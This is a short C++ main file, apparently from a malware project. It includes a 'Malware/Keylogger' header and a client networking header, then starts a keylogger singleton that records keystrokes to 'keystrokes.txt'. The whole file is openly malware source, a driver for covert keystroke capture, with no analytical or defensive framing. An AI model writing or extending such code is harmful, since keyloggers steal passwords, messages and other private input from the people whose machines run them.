#include"../lib/Networking/ClientNetwork.hpp"
#include "../lib/Malware/Keylogger.hpp"
#include <iostream>

int main() {
    Keylogger* keylogger = Keylogger::getInstance("keystrokes.txt");
    keylogger->Run();
    return 0;
}

